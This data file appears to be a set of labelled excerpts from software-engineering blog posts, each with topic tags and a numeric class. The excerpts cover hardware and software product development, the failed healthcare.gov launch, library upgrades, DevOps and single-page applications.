96,"Algorithms, Physics, and Data Science: this is usually the brain of the product, where companies tend to claim their IP is in. Board designers work with physicists to select sensors, to design AFE (analogue front end) around them or to design a special antenna. Embedded developers work with DSP engineers and mathematicians to embed real-time DSP algorithms in their software to filter signals, to detect patterns, or to implement some optimised mathematical formula to process/encode the data. Real-time means that you have to complete the processing within a certain amount of CPU cycles, otherwise you wont be ready to process the next signal and miss it or wont be able to output events within the required latency. Backend developers work with data scientists to implement batch processes to recommend new products, find anomalies, suggest friends, train a deep learning model, use NLP to analyse text, score web pages, etc. Frontend developers have all the fun. With library such as D3JS, they create amazing visuals and present the data to the users in a useful and aggregated manner.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",5
97,"Reliability/Durability (Life Cycle Test): These are tests that try to simulate what happens to the product during its entire life. Its more relevant to physical products where materials reach their failing points. There are certain rules which the industry came up with to help us accelerate the product age by exposing it to extreme environmental conditions. Basically, to test if a product functions correctly after five years at room temperature, we can test it at 70 degrees and 10g vibration for one day(example only!!!). These are called HALT (Highly accelerated life) tests Extreme conditions Tests (Load, Edge): These are tests that test the behaviour of the product in extreme or edge conditions. For example, if an electronic product works on 5V, we will test it at 4.5V and 5.5V, we might even inject voltage spikes as high as 25V or -5V to see if the product is resilient to user mistakes or electrical surges. For digital products we might challenge input fields with unreasonable values. For examples we might input names which are 1000 characters long, or has meaningless symbols. if we designed the product for a certain load (50 concurrent users), we will test its behaviour under 100 concurrent users. The idea of these tests is mainly to uncover new failure modes. We dont expect the product to work perfectly, but we might discover important issues, unexpected behaviours or bottlenecks that are relevant also to normal conditions.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",5
98,"Test Coverage: As a board designer you can never be sure that the manufacturing process was without defects. In some cases, there are tiny shorts between adjacent traces that you can only see with a microscope. In other cases, electronic components are not reliable enough or might even be counterfeit components. As part of the quality process, board designers and embedded developers must work together to write testing tools that verify that every connection and every component work as expected with 100% coverage. Ive worked on testing JIGs that simulate every sensor and every input to the board to reach 100% coverage. Its also a good practice to run these tests in parallel with highly accelerated screening tests (HASS) where the board is exposed to vibration and thermal cycles.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",13
99,"Anyone who thinks they dont, are either not experienced enough or have a short memory. In particular, when designing the layout of a PCB board and placing new components, its extremely easy to make mistakes regarding the pinout configuration and physical dimensions of the new components. mistakes you will only find weeks or months later. You can look at the design, and verify it against the datasheet, look again, and verify again, and in both cases, you will miss it. For this reason, an independent review and sign-off are a standard practice in electronic product development. Software developers often make mistakes with regard to security. For example, they often put sensitive keys in public code repositories or exposed to the client. Pull request is a method of letting other team members know about your changes before you commit them. They serve multiple purposes: To detect defects and issues, to improve the readability and documentation of the code, and to share knowledge across the team. Pair programming is another method which is used by software developers to share knowledge and to review each others code.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",13
100,"Configuration Management: CM is the practice of handling changes systematically. It is used to document versions of the product and to track changes that applied to it between versions. A good configuration management system will allow you to build and test any version of the product using only the artefacts that are in it without any other external knowledge. Dev Ops engineers use SCM (Software configuration management) tools like GIT, Ansible, Terraform, Chef to record the code, configuration and infrastructure of the product. They might also tie these changes to JIRA issues to document the relationship between the bug/defect/feature request and the actual changes that resulted from it. Electronic engineers use tools which are called sometimes PLM (product lifecycle management) and sometimes HCM (hardware configuration management). Essentially they serve the same purpose, but they include different integrations and processes. For example, a PLM system might also integrate into your ERP system to show which parts of the products BOM are present in your inventory.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",18
101,"Lean Lean is everything relating to saving cost. For physical products, lean means: Zero delay through all the stages of the production line Pay Defects, Highest quality for every final product Machines/People are 100% utilised Knowledge feedback: Every lesson and insight improve the process Just in time manufacturing: Every product is sold, no Waste For Digital products lean means: Auto-scaling: computational resources scale based on the load Pay per hour Manufacturing Pipelines: Setting up an assembly line is not too different from setting up a software CI/CD (Continuous integration / Continuous delivery) pipeline. If youve read the Phoenix project book, you will probably remember how some of the concepts of lean and Dev Ops were derived in the book from the physical manufacturing line. Both pipelines handle everything which is required to build, test and ship your product. As you add more automation, you can ship faster. For electronic products this means reducing costs and defects and improving capacity, for digital products, this means faster user testing and adaptive design.","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",12
102,"Worldwide delivery: There is an interesting similarity between content delivery networks (CDN) which are used to deliver web assets to users based on their geographical location, and how manufacturing is distributed around the world to reduce shipping costs and to localise products. Content caching can be seen as local warehouses or fulfilment services such as Amazon. For both types of products, local presence improves the overall customer experience across the world It might seem that worldwide presence is harder for physical products, however, data protection regulation and language localisation require significant effort as well Cloud services: Cloud services are awesome, you can build your digital product in seconds by choosing from hundreds of web services. A few clicks and it will run automatically on more than 20 data centres around the world and scale based on the demand. There is nothing like that in manufacturing but this might be the next industrial revolution. Imagine a digital product where you can set up a manufacturing pipeline using preconfigured modules such as 3D printing, PCB manufacturing, component sourcing, board and cable assembly, running tests and shipping directly to your clients from a local automated manufacturing floor. Moreover, the service will allow the end user to customise the colour of the product, the shape and other personalisation features. This seems like a dream, but I am sure that somewhere around the world Amazon is working on such a service (At least I hope they do).","['Hardware', 'Software', 'Firmware', 'Product Development', 'Design']",17
103,"But if we have a concern, its that there hasnt been a huge leap forward in social coding in the last decade. We simply havent seen enough innovation in recent years in the way that coders collaborate, and since every developer will be thinking about these big ideas right now, we wanted to paint a picture of what social coding could look like over the next decade. A lot of people will (understandably) be thinking about backing up their Git Hub projects just in case, and we think you should use that opportunity to look at Glitch and consider if its time to rethink traditional views on version control entirely. (Spoilers: If youre using Glitch, youve already got a preview of where were headed. If youre not, heres how to import a Git Hub repo to Glitch. If you have a Node app that youve built or like to use, start with that! Many developers may not know this, but at Fog Creek, we have a deep background in distributed version control systems. We launched Kiln (now available as an integrated version control system in Manuscript) almost a decade ago with a number of groundbreaking features for teams to collaborate on coding. Our path was to take great project management and add version control to it, and this approach taught us a lot about how people can do their best coding together.","['Git', 'Github', 'Software Development', 'Coding', 'Programming']",12
104,"On 1 October 2013, the __url__ website was launched under the provision of the Patient Protection and Affordable Care Act. Most website users experienced crashes, delays, errors, and slow performance throughout the days and weeks following its much heralded release. The site received over four million unique visitors on the first day, and only six people successfully enrolled in health plans that day. By some estimates, only 1% of interested users were able to enroll during the first week of operation during which the site had over eight million visitors. Even when users managed to register and shop online, they were later confronted by frustrating errors or confusing duplicates in the enrollment applications submitted to insurers. The site was taken down during the first weekend for major repairs because it was practically unusable. There were also multiple security defects found including insecure transmission of personal data, unvalidated password resets, error stack traces revealing internal components, and violations of user data privacy. The US Government Accountability Office (GAO) estimated that the US federal government and American taxpayer spent around $840 million USD developing the website. The __url__ site was plagued by many mistakes common on large IT projects and systems; this essay will explore the major business, technology, and human factors that contributed to the launch failure of healthcare.gov.","['Healthcare', 'Obamacare', 'Project Management', 'Software Development', 'Healthcare Dot Gov']",17
105,"According to the Organization for Economic Cooperation and Development (OECD) and the Kaiser Family Foundation (KFF), the US spends 17 percent of its gross domestic product (GDP) on healthcare, more than any nation in the world in terms of the total amount and relative to its economys size. The rate of healthcare spending is also increasing faster than the economys growth rate such that the Congressional Budget Office (CBO) estimates that health care related spending will consume 40 percent of US GDP by 2080. However, there is significant inequality and disparity in access to healthcare in the US. According to the KFF, the overall infant mortality rate in the US is 5.8 per 1000 live births in 2014; for blacks this rate is 10.9, while for whites the infant mortality rate is less than half that at 4.9. It is also worth noting these US infant mortality numbers are worse than the comparable OECD country average of 3.4. Again per the OECD and KFF, hospital admissions for preventable diseases such as congestive heart failure, asthma, diabetes, and hypertension are more frequent in the US than in comparable countries in the OECD. The US life expectancy of 79 in 2015 is less than the average of 82 for comparable countries in the OECD, and that trend has been getting worse since 1980 according to the KFF. Furthermore, 50 million Americans, almost one in five of the non-elderly, had no health insurance coverage in 2010. Many of these problems can be explained by the fact that the US is the only major industrialized nation without universal access to basic healthcare. With individuals, corporations, and the government all spending more on healthcare and the system delivering lower quality outcomes than other comparable countries, the US environment was ready for a change.","['Healthcare', 'Obamacare', 'Project Management', 'Software Development', 'Healthcare Dot Gov']",16
106,"On 23 March 2010, President Barack Obama signed into law the Patient Protection and Affordable Care Act (ACA), the most comprehensive reform of the US medical system in fifty years. The ACA transformed the non-group insurance market in the US, mandated that legal residents have health insurance or pay a tax penalty, raised revenue through a variety of new taxes, subsidized private insurance coverage based on income-eligibility, reorganized spending under the countrys largest public health insurance plan for the elderly and poor (e.g. Medicare and Medicaid), and compelled insurers to make basic insurance plans available to all legal residents regardless of pre-existing conditions. The law required the establishment of health insurance marketplaces by January 1, 2014. The marketplaces permit individuals to compare and select insurance plans offered by private insurers. For states that elected not to establish a marketplace, the Centers for Medicare and Medicaid Services (CMS) was responsible for providing a federally facilitated marketplace (FFM). In September 2011, CMS signed contracts with key vendors and began development of the __url__ system in December 2011.","['Healthcare', 'Obamacare', 'Project Management', 'Software Development', 'Healthcare Dot Gov']",16
107,"President Obama @ Prince George Community College in Maryland Late September 2013Although the __url__ project had only just begun, the seeds for future difficulties had already been planted in several areas. First, CMS did not have the People in terms of organizational experience for developing and managing large IT systems. Other US government agencies such as the Department of Defense (Do D) and National Aeronautics and Space Administration (NASA) had decades of institutional experience in developing, delivering, and operating reliable IT systems. Serving as the lead project manager and integrator for a complex, first-of-its-kind system was beyond the capability of CMS, and a better decision would have been to assign this responsibility to a primary vendor. Second, there was a project Leadership gap. Although CMS and its Deputy CIO (Henry Chao) managed the project in theory, other key members of the project steering committee including the White Houses CTO (Todd Park), executive Office of Health Reform (Jeanne Lambrew), and the Department of Health and Human Services (Kathleen Sebelius, Bryan Sivak) exercised more influence and power in practice; they delayed important decisions at the start and increased scope at the end which contributed to the launch failure. Additionally, no one at the various agencies involved in the project had visibility on all the critical milestones that each different group needed to reach in order to complete the project successfully. Remarkably, the executive Office of Management and Budget (OMB) did not take an active role in the project although this was well within its responsibilities especially when one considers that it had established an executive IT dashboard to monitor large federal IT projects and investments since 2009. The irony of the government demonstrating poor project governance practices should not lost be upon the reader, a theme we shall oft return to. One subtle aspect of the Leadership issue was the Cognitive Bias inside the White House about its unique ability to leverage IT. The Obama campaign teams had pioneered the use of social media and data mining in the 2008 and 2012 presidential elections, respectively. These successes resulted in executive overconfidence and set unrealistic expectations about what could be immediately delivered. As we will see later, this cognitive bias would haunt the __url__ launch when the deadline loomed.","['Healthcare', 'Obamacare', 'Project Management', 'Software Development', 'Healthcare Dot Gov']",16
108,"Third, there were serious Procurement problems found by the GAO and the HHS Office of Inspector General who conducted separate audits into the launch of the __url__ website. According to the GAO and HHS audit reports, CMS awarded sixty (60) contracts to thirty three (33) different vendors, but did not satisfy important aspects of Federal Acquisition Regulation (FAR) which is the common procurement framework across US federal agencies. The largest contract was granted to Conseillers en Gestion et Informatique (CGI), a Canadian IT company headquartered in Montreal that employed more than 70,000 people, reported revenues of $10 billion in 2013, and was worth more than $11 billion on the TSX in 2013. CGI was a roll-up conglomerate that grew by acquiring others; it had expanded into US government contracts with two recent investments: the 2004 purchase of American Management Systems and the 2010 purchase of Stanley. One of the procurement problems identified by the GAO and HHS reports was CMS did not clearly assign a lead system integrator role to any of the primary vendors selected in the key contracts until after the October 2013 launch. The CMS CIO reported to the OIG that CMS perceived CGI to be the projects lead integrator, but the company stated it did not have the same understanding of its role. Second, CMS had not prepared a written procurement strategy to describe the overall procurement process of __url__ and document the factors, assumptions, risks, and tradeoffs that would guide project decisions. CMS leadership claimed that they were unaware of this FAR requirement, further confirming their lack of experience with managing large federal IT projects. Third, CMS did not conduct thorough past performance reviews of potential contractors and did not use the federal governments own contractor database (e.g. PPIRS) when evaluating bids on four of the six key contracts. Fourth, CMS used previously negotiated contracting vehicles for conducting large portions of the FFM project that avoided procurement review, were cost-plus, and put much of the financial risk on the government instead of sharing it with the vendor. In 2007, the CMS established an Enterprise System Development (ESD) Indefinite Delivery Indefinite Quantity (IDIQ) contract for its ongoing IT needs, conducted a full and open competition, and awarded the ESD IDIQ contract to sixteen (16) companies. The IDIQ contract type streamlines future procurement decisions, does not require the usual oversight from the Contract Review Board (CRB) irrespective of dollar value, and per HHS procurement guidelines does not require contract acquisition plans. Fifty-three of the sixty FFM contracts including the six key contracts did not have individual acquisition plans, fifty-five of the contracts were awarded as orders under previous contracts, and only two of the six key contracts were reviewed by the CRB. Furthermore, CMS solicited a proposal from only one company for one-third of the sixty contracts. The CMS justification for all these issues was ignorance of regulations and the need for speed in kicking off the project without a lengthy procurement process. CGI was eventually fired and then replaced by Accenture in January 2014 as the lead contractor.","['Healthcare', 'Obamacare', 'Project Management', 'Software Development', 'Healthcare Dot Gov']",16
109,"The fourth major factor contributing to the system launch failure was the Complexity of the technology architecture. The __url__ system consisted of four primary technology components: a front-end website for the FFM, a back-end data services hub, an enterprise identity management sub-system, and the hosting infrastructure. The first component was the __url__ website; the site allows users to create an account, input required information, determine eligibility for financial assistance, view health care plan options, select a plan, and then pay for the plan. The websites UI was originally developed by CGI and Development Seed using several web tools including Bootstrap, CSS, j Query, Jekyll, Prose.io, and Ruby. Analysis by App Dynamics and Mountain River using Fire Bug, Grease Monkey and YSlow revealed that site page templates contained more than ninety (90) external resource references including around forty (40) CSS and fifty (50) Java Script files. Simple web pages during the registration process could regularly take 8 seconds to load, and App Dynamics reported latency of 71 seconds for user account registration pages with client-side loading and rendering taking 12 seconds and server-side responses taking 59 seconds; the website Performance was unacceptable to users and was another major factor contributing to the system launch failure. Most web content frameworks have resource optimization features to aggregate and minify CSS and JS files, but it appears that the engineering team was not aware of these features or just did not test enough, another theme we shall revisit repeatedly. Smart Bear and others also found evidence of sloppy code in the front-end with Lorem Ipsum filler text littering the website pages from machine generated HTML5 code as well as typos and editorial comments that are usually removed from software builds released to production through formal peer review. The second component was the back-end data services hub developed by CGI and QSSI using Java, JBoss, Web APIs, and the No SQL Marklogic database. The hubs responsibility was to orchestrate data and services from multiple external sources such as agent brokers, insurers, CMS, DHS, Experian, IRS, state insurance exchanges, and SSA. According to Enterprise Tech magazines interviews with engineers at Marklogic, the Java middleware objects were machine generated for rapid development; their consensus was theyll perform well for 1,000 users, just not 100,000 [concurrent] users because theres so much overhead built-in. The data hub confirms an applicants Social Security number by routing the request to the Social Security Administration (SSA). The hub verifies a users citizenship and immigration status by forwarding the request onto DHS. The data hub similarly confirms eligibility for financial assistance by connecting to the IRS and requesting user information on income and family size. The hub verifies a users residency and employment by forwarding the request onto Experian. The hub also communicates with insurers by sending enrollment requests as EDI forms F834 and handling enrollment responses. Many users reported a variety of enrollment errors ranging from garbled data, to outright F834 syntax mistakes, and frustrating duplication with multiple enrollments submitted for a given user. While unit and component testing could be completed by different teams in isolation, integrating the system requires coordinated planning and testing by a skilled team of teams because the common developer refrain of my stuff works on my machine is more problematic and compounded when integrating complex software written by distributed teams. The third component was the Oracle Enterprise IDentity Management (EIDM) system for which QSSI was also responsible. Experts believe this identity service was a serious bottleneck because the data services hub synchronously invoked this service on every user request for authentication and authorization. The system had only been tested with an expected load of a 2,000 concurrent users instead of the tens of thousands of concurrent users that actually visited the site during the first week. The project teams war room notes for the week of system launch are sprinkled with comments about additional server hardware being setup for ensuring EIDM capacity and ongoing software issues in the EIDM itself. The fourth system component was the hardware infrastructure hosting the website, FFM, data services hub, and EIDM. The front end website was hosted on Akamais Content Delivery Network (CDN). The original back end infrastructure consisted of forty-eight (48) VMWare virtual machine nodes running Red Hat Enterprise Linux (RHEL) hosted on twelve (12) physical servers located in a single Terremark data center. Oddly, some of the VMWare servers ran v Sphere v4.1, and others ran v5.1. Furthermore, according to Enterprise Techs interview with Marklogic, the network was also misconfigured to run at at 1 Gb/sec which was below its full capacity of 4 Gb/sec. With over 8 million visitors in the first week and thousands of concurrent users, the site was a victim of its own success, and the GAO audit report confirms that CMS did not adequately plan and setup hardware capacity for the back-end. On 28 October 2013, there was also an unplanned network outage in the data center hosting the sites backend data services. Considering the presence of issues within and across multiple technology components, there was insufficient Architecture and Quality Assurance on this Complex system. The system defects in the website, enrollment, identity, and infrastructure services should have been identified and fixed before launch, and they were further proof that CMS was in over its head as the technology project lead and probably putting that head in the sand when sharing status updates with the project steering committee in the late summer of 2013.","['Healthcare', 'Obamacare', 'Project Management', 'Software Development', 'Healthcare Dot Gov']",10
110,"Project Management strategy and tactical execution directly contributed to the launch failure of healthcare.gov. First and foremost, the Scope should have been limited to a modest beta upon launch. The Minimum Viable Product (MVP) could have been a simpler site that allowed users to compare different health plans and then purchase the insurance by going directly to the insurers website or using manual, offline processes that were reliable and secure. In fact, the __url__ site does just that. Its alpha version was built by three people, and it was delivered to production in a month. The site did not require user registration, used only zip code, age, and income to filter choices, and was initially based upon a spreadsheet export from __url__ conforming data from the insurance health plans available in the different states. H __url__ was a Y-Combinator startup, backed by Kapor Capital, and founded by George Kalogeropoulos, Ning Liang, and Michael Wasser; this site has helped more than a million people sign up for health insurance through the ACA and continues to be an active, useful service today. Another issue affecting the projects Scope and Schedule was the delay in the publication of regulations that would guide system development. This resulted in some tasks that could not start and others that had to be redone. Some of the regulatory delay could be attributed to the gridlocked Politics after the midterm elections of 2010 and the administrations desire to postpone controversial rulings until after the presidential elections of 2012. For example, HHS issued the final rules on private insurance as late as February 2013; these rules included insurance premiums, coverage availability, risk pools, and catastrophic plans. These business rules had to be translated into system requirements and then developed into software. Furthermore, HHS also delayed the date by which states had to commit to either operating a state exchange, partnering with the federal government, or letting the federal government run the exchange. Initially, states had to decide by November 2012, but HHS delayed the deadline until December 2012 with some states slipping to February 2013. Postponing these decisions reduced the time the time that CMS and states had to connect their systems together. Politics and the overconfidence bias also surfaced in August 2013 when the White House and executive Office of Health Reform insisted on requiring site user registration before shopping for insurance so that concrete user numbers could be shown as proof of the systems success. According to a Senate audit report, this goal line audible and project change was not communicated to QSSI and this created further discrepancy between the actual and expected load on the EIDM. Interestingly, the existing health insurance exchanges of Kentucky and Massachusetts that were inspirations for __url__ both allowed users to browse and window shop anonymously much like healthsherpa.com. The bottom line is with just over a month before the release deadline, Scope was still expanding on the __url__ project when the focus should have been on mitigating the myriad risks, shrinking scope, testing the system end-to-end with expected load, revisiting hardware capacity plans, conducting security audits, documenting the release checklist, and planning operational support. Experienced project managers are familiar with the classic triangle of project constraints: Scope, Cost, and Quality. It is a challenge to satisfy all three; the usual balancing act especially at the end of a project involves one of the three giving way to the other two. Since Scope was changing and the Time (Cost) deadline was fixed, one could expect that the Quality would decrease, and this is exactly what happened. The GAO report describes in September 2013 (less than 1 month to go live) that CMS had identified 45 critical and 324 serious code defects across FFM modules. Second, the project should have adopted a true Agile System Development philosophy and a lean software manufacturing process such as Scrum or Kanban in which the sprints are driven by the top priorities, include the full end-to-end testing of the technology solution, and produce real, deliverable artifacts that users can get business value from. Media reports that some of the component teams refined the UX through wireframes, worked in sprints, had a war room with story cards on the walls, and published code on Github were a glossy veneer around the Waterfall process that stacked component construction in parallel and delayed integration testing until the end. Third, the project steering committee should have elected one project Executive with the authority to make final decisions after consultation with key stakeholders. The diffuse distribution of authority, management by consensus, and lack of accountability on the project led to the tragedy of the commons in which everyone had a piece of this or that, but no one was in charge. Of course, a leader can only make good decisions if they are well informed, so coupled with authority, they needed transparency and status visibility for critical path components that different groups were working on as well as unified release calendar for all the critical path milestones.","['Healthcare', 'Obamacare', 'Project Management', 'Software Development', 'Healthcare Dot Gov']",16
111,"One might reasonably wonder that with all these problems whether there was someone sounding the alarm to change course before the release deadline: delay the project, strengthen the leadership role, reduce and freeze scope of the v1.0, test the system A-to-Z, and ensure that sufficient resources were available to launch the system successfully and operate it going forward. While system development was ongoing, CMS did obtain independent audits from several private sector firms including Mc Kinsey, Mitre, and Turning Point. The Mc Kinsey report was based on analysis of project documents, interviews with project officials, and participation in meetings to assess and influence the facts on the ground. The Mc Kinsey report released in April 2013, highlighted the initiatives Complexity, and identified more than a dozen critical risks spanning the marketplace technology and project governance. In the latter category, the report mentioned the waterfall SDLC process, uncertainty of v1.0 requirements, multiple definitions of success, heavy dependence on 3rd party contractors, parallel stacking of phases, inadequate integration testing window, the Big Bang launch volume, the matrix management, the absence of clear leadership roles and responsibilities, and the lack of an end-to-end operational view of critical path interdependencies across agencies or within an agency. The report also described several options to mitigate these risks, but the project steering committee did not act upon the Mc Kinsey reports findings and recommendations before system launch.","['Healthcare', 'Obamacare', 'Project Management', 'Software Development', 'Healthcare Dot Gov']",1
112,"In late October 2013, HHS announced several changes to the __url__ project. First, project management was centralized and led by Jeffrey Zients, former OMB director. Zients had been a successful management consultant and CEO in the corporate world; he also had a rockstar reputation within the White House for solving tough problems and managing successful teams. Second, Todd Park, White House CTO, reorganized the technology leadership team, demoted some of the underperforming CMS employees and 3rd party contractors, and recruited top talent from Silicon Valley for a government sabbatical to save the site. Third, a Tiger team was formed with the narrow mandate of getting Production working properly; the team scrummed daily, triaged existential risks, and prioritized the most important defects on the critical path. Over the next six weeks, the team fixed around 400 system defects, increased system concurrency to 25,000 users, and improved website page responsiveness to one second. Enrollment jumped from 26,000 in October to 975,000 in December. The tech surge worked so well that many of the Silicon Valley fellows stayed on to establish the successful US Digital Service organization in 2014 to transform important, public-facing digital services provided by the government. If the careful reader is willing to put aside partisanship and look beyond the politics and economics of the ACA, there are many lessons that one can learn from the failed launch and recovery of the __url__ system.","['Healthcare', 'Obamacare', 'Project Management', 'Software Development', 'Healthcare Dot Gov']",16
113,"When one of your core libraries releases a major version, it is time to start thinking about upgrading. The first questions that should come to mind are: How mature is this version? Does it have several open issues? Is it stable enough to be used? Being an early adopter of a new library version always comes with some risks, mainly because bugs are common in new versions, that need time to be fixed. However, if time constraints arent a concern, being an early adopter is an excellent opportunity to contribute to open source projects. It allows you the chance to test any new versions first-hand and potentially provide solutions to any bugs you encounter. However, if time is a constraint, it is most likely better practice to wait until the library becomes more mature, in order to avoid dealing with potential bugs.","['JavaScript', 'Software Engineering', 'NPM', 'Front End Development', 'Frontend']",18
114,"Here are the main reasons why upgrading libraries are important: New features: Most dependencies have a clear roadmap for new features. For example, in React 16.0 they added native support for the concept of Portals. In previous React versions, this concept was only supported by third-party libraries like react-portal. Performance improvements: In addition to new features, performance improvements are also made frequently. Fixed bugs: Although it is normal to find bugs in libraries that you depend on, patch releases help fix these issues. Security patches: Security patches are one of the most important reasons to have your libraries up-to-date. Are you familiar with the Equifax security breach? TL;DR, the Equifax hack was possible because of an external library the company relied on, which had a gaping security flaw. The external library itself received a patch to fix the issues, but Equifax never updated the internal code used in their systems. This was missed despite the fact that the library team knew of the vulnerability and even released a security update.","['JavaScript', 'Software Engineering', 'NPM', 'Front End Development', 'Frontend']",18
115,"Meanwhile, the new release brought more important features that needed to be addressed. Since these features were critical, all of our resources were allocated to developing them, leaving us no time to continue testing the React migration. When we finally had time to return to testing, the branch where we were performing the migration was significantly behind the master branch. When we rebased it, we discovered several issues. To fix these problems, we spent an additional week on the process since several changes were needed. As a result, the migration was delayed and more work was needed than initially planned.","['JavaScript', 'Software Engineering', 'NPM', 'Front End Development', 'Frontend']",10
116,"Imagine that a library named X has a peer dependency on React 15.6 and you are migrating your application to React 16.4. Youll probably get the following error message: Ive seen many projects where the solution to this problem is to simply fork the library, update its peer dependency and update the __url__ file to use the forked version. Please dont This approach is bad behaviour and should be avoided at all costs. In the long run, you end up shooting yourself in the foot because it will be harder to upgrade the library. Rather than putting yourself in a difficult position, you can view this as an opportunity to contribute to open source projects.","['JavaScript', 'Software Engineering', 'NPM', 'Front End Development', 'Frontend']",18
117,All engineers do not like doing all things. A growing engineering organization that supports specialists has to grapple with the fact that employee happiness sometimes involves working on certain types of problems and not others.,['DevOps'],12
118,"As an industry, we now expect to hire people who can step in and develop and operate Internet services. However, we almost universally do a terrible job of both the new hire and continuing education required to perform this task. How can we expect engineers to have operational intuition when we never teach the skills? As the engineering organization hiring rate continues to ramp, there comes a point at which the central infrastructure team can no longer both continue to build and operate the infrastructure critical to business success, while also maintaining the support burden of helping product teams with operational tasks. The central infrastructure engineers are pulling double duty as organization-wide SRE consultants on top of their existing workload. Everyone understands that education and documentation is critical, but scheduling time to work on those two things is rarely prioritized.",['DevOps'],12
119,"If you have a python3 installation on your computer you can also do Ok, you have the router running, but it is running on your local machine and not reachable from the internet. To temporarily give it a publicly reachable ip address the easiest way is to use tunneling with ngrok. You do have to sign up but otherwise you can use it for free for our example here. So download the tool unzip it in a folder then go to that folder with your terminal and do You will get an output like this Please note the temporary address you got which in the upper example isbut yours will be different! To receive some data into Repods we need some data that is being published. Here you would have a sensor publishing temperatures or something similar in a real life example. Here we are going to publish an incremental counter on the topicevery second.","['IoT', 'Data Engineering', 'Data Warehouse', 'Data Streaming', 'Iot Platform']",7
120,"A few months ago I published an article about the pros and cons of Dev Ops as a Service. There I mentioned AWS and Google Cloud Platform as the main platforms that are frequently used by Dev Ops. Why cant we make a small comparison for them? Sure, theres also Microsoft Azure among the giants. But Ill try to come back to it later. So, today Im going to make a basic comparison for AWS vs Google Cloud Platform in the term of using these cloud computing providers for Dev Ops.","['Cloud Computing', 'AWS', 'Google Cloud Platform', 'DevOps', 'Software Development']",10
121,"Nowadays, many organization adapt Dev Ops and migrate their apps to the cloud. Basically, it is the migration of your tools and processes for continuous delivery to a hosted virtual platform. How to choose a better cloud computing provider? Lets start with Amazon Web Services (AWS). AWS has already built a powerful global network to provide a virtual host for some of the worlds most complex IT environments. Its data centers are fiber linked and arranged all over the world. In AWS the payments are scheduled according to the services you use down to the millisecond of compute time. In a nutshell, AWS is a fast and relatively easy way to migrate your Dev Ops to the cloud.","['Cloud Computing', 'AWS', 'Google Cloud Platform', 'DevOps', 'Software Development']",11
122,"GCP Deployment Manager Google Cloud Deployment Manager allows you to specify all the resources needed for your application in a declarative format using yaml (or Python, or Jinja2). This means that rather than painstakingly listing each step that will be required for a deployment, Dev Ops teams can tell Deployment Manager what a final deployment should look like and GCP will use the necessary tools and processes for you. When a perfect deployment procedure is developed, it is saved to be repeatable and scalable on demand. With Google Cloud Deployment Manager you can do deploy many resources at one time, in parallel, pass variables into your templates and get output values back, view your deployments in the Google Cloud Console in a hierarchical view and more GCP Cloud Console Cloud Console gives you a detailed view of every detail of your Dev Ops in the cloud. Web applications, data analysis, virtual machines, datastore, databases, networking, developer services Google Cloud Console helps you deploy, scale and diagnose production issues in a simple web-based interface. From virtual machines to release management and rollback, master, monitor and manage all things GCP from the desktop or on the fly. With GCP Cloud Console for Dev Ops, you can easily take charge of the cloud-based continuous delivery cycle.","['Cloud Computing', 'AWS', 'Google Cloud Platform', 'DevOps', 'Software Development']",7
123,"If you have never worked with a Single-page app, you might underestimate the difficulties you will face. I know because I have made that very same mistake in the past. A rich Javascript model of domain objects? And, hey, this framework is going to do all the heavy-lifting.","['Rails', 'JavaScript', 'Turbolinks', 'Single Page Applications', 'Alternative']",19
124,"For example, imagine you are dealing with invoices. You might have a javascript Invoice class that exposes a method total that sums all the items so that you can render that amount. In the server, you also need an Invoice class with a total method, for calculating that amount when sending invoices by email. Client and server Invoice classes implementing the same logic.","['Rails', 'JavaScript', 'Turbolinks', 'Single Page Applications', 'Alternative']",15
125,"As mentioned above, isomorphic Javascript might mitigate this problem by making easier to share code. And I say mitigate because the mapping between client and server objects is not always 1-to-1. You will want to make sure that some code never abandons your server. A lot of code will only make sense in the client. And also, some concerns are just different (e.g., a server element might persist data to the database, but the client counterpart might use some remote API). Sharing code, even if possible, is a hard problem to solve.","['Rails', 'JavaScript', 'Turbolinks', 'Single Page Applications', 'Alternative']",15
126,"For example, for keeping data consistency in the server, you can leverage on database constraints, model validations and transactions. If something goes wrong, you respond with an error message. In the client, things are a bit more complicated. A lot can go wrong, just because a lot is going on. Maybe some record saves successfully, and some other record fails. Perhaps you go offline in the middle of some operation. You need to make sure the UI stays consistent at all moment, and that the app recovers gracefully when errors happen. All this is doable, of course, its just much harder.","['Rails', 'JavaScript', 'Turbolinks', 'Single Page Applications', 'Alternative']",13
127,"I used to have concerns about its performance. What convinced me was using it in a project, but you can just start a trial in Basecamp and play around. Try to create a project with some elements and then navigate around by clicking the different sections. This will give you a good idea of how Turbolinks feels.","['Rails', 'JavaScript', 'Turbolinks', 'Single Page Applications', 'Alternative']",19
128,"I think many developers today look at Ajax rendering and SJR responses with disdain. They are a tool, and as such, can be abused and misused. But when used right, they are a terrific solution. The let you offer great UX and interactivity at a very low cost. Sadly, as Turbolinks, it is difficult to appreciate them unless you have fought a few SPA battles first.","['Rails', 'JavaScript', 'Turbolinks', 'Single Page Applications', 'Alternative']",19
129,"This post assumes you already have gcloud installed, and a GCP Project to work in. Since this is all a one-time setup anyway, I highly recommend using Google Cloud Shell since it has everything pre-installed and configured. Once you run through this guide you can stay local. If you have neither gcloud or a GCP project to try this with, check out the following: Install gcloud (its easy): __url__ now.","['Docker', 'Kubernetes', 'Containers', 'Google Cloud Platform', 'DevOps']",7
130,"Most new features which are version control related are coming to Git only, sometimes because they wouldnt even make sense on a TFVC scenario. Take the New Branch feature that work items have on the kanban board now for example. With Git this allows us to create a new branch directly from the work item and when we make a Pull Request to master later this same work item will already be referenced. Also, whenever someone wants to check the progress of this work item will be able to see the branchs commits referenced from the work item itself. Can you even consider creating a branch for every work item? Depending on the size of the project the time to create the feature branch on TFVC will be more than it would take to complete the demand and push it to the master on Git.","['Git', 'Vsts', 'Azure Devops', 'Team Foundation Server', 'Microsoft']",18
